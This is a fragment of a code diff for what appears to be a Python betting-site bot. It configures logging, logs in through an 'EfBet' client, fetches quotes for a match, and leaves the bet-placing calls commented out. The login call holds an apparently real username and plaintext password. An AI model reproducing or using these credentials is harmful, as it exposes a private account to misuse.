+    file_handler.setLevel(logging.DEBUG)
+
+    logger.addHandler(file_handler)
+    logger.addHandler(stream_handler)
+
+    eb = EfBet("npsassari", "Forzainter1$")
+
+    quotes = eb.search_match("14460")
+    print(quotes)
+    input()
+
+    # eb.place_bet(quotes, "1", 1)
+
+    # bet_result = eb.wait_bet_to_end()
+    # print(bet_result)
